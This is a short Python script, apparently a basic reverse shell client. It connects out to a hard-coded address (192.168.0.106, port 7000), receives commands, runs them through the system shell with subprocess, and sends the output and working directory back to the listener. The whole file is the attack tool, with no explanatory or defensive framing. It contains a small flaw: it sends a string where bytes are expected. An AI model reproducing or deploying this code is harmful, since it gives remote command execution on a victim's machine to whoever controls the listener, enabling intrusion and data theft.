import os,socket,subprocess
s = socket.socket()
host = '192.168.0.106'
port = 7000

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0 :
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell = True, stdin=subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes)
        s.send(str(output_str+str(os.getcwd()) + '>'))
        print(output_str)
        
s.close()
